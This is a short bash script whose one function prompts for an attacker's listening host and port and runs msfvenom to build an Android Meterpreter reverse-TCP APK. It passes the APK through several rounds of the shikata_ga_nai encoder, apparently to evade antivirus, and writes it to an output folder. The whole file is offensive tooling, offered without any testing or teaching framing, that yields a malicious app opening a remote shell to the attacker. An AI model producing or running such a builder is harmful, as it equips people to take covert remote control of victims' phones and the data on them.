#!/bin/bash

# Colorization for themed output
default="\033[0m"
red="\033[1;31m"
green="\033[1;32m"
blue="\033[1;34m"
cyan="\033[1;36m"
yellow="\033[1;33m"

encode_payload() {
  OUTPUT_DIR="./output"
  ENCODED_PAYLOAD="$OUTPUT_DIR/encoded_payload.apk"

  # Debug message
  echo -e "${blue}[DEBUG] Starting payload encoding with shikata_ga_nai...${default}"

  # Prompt for LHOST and LPORT
  read -p "Enter LHOST: " LHOST
  read -p "Enter LPORT: " LPORT
  read -p "Enter encoding iterations (default: 5): " ITERATIONS

  # Set default iterations if not provided
  if [[ -z "$ITERATIONS" ]]; then
    ITERATIONS=5
  fi

  # Ensure output directory exists
  mkdir -p "$OUTPUT_DIR"

  # Run msfvenom encoding
  echo -e "${cyan}[DEBUG] Encoding payload with the following settings:${default}"
  echo -e "${yellow}  LHOST: $LHOST${default}"
  echo -e "${yellow}  LPORT: $LPORT${default}"
  echo -e "${yellow}  Iterations: $ITERATIONS${default}"
  echo -e "${blue}[DEBUG] Running msfvenom...${default}"
  if msfvenom -p android/meterpreter/reverse_tcp LHOST="$LHOST" LPORT="$LPORT" -e x86/shikata_ga_nai -i "$ITERATIONS" -o "$ENCODED_PAYLOAD"; then
    echo -e "${green}[LOG] Payload encoded successfully: $ENCODED_PAYLOAD${default}"
  else
    echo -e "${red}[ERROR] Failed to encode payload.${default}"
    exit 1
  fi

  echo -e "${cyan}[DEBUG] Finished payload encoding.${default}"
}
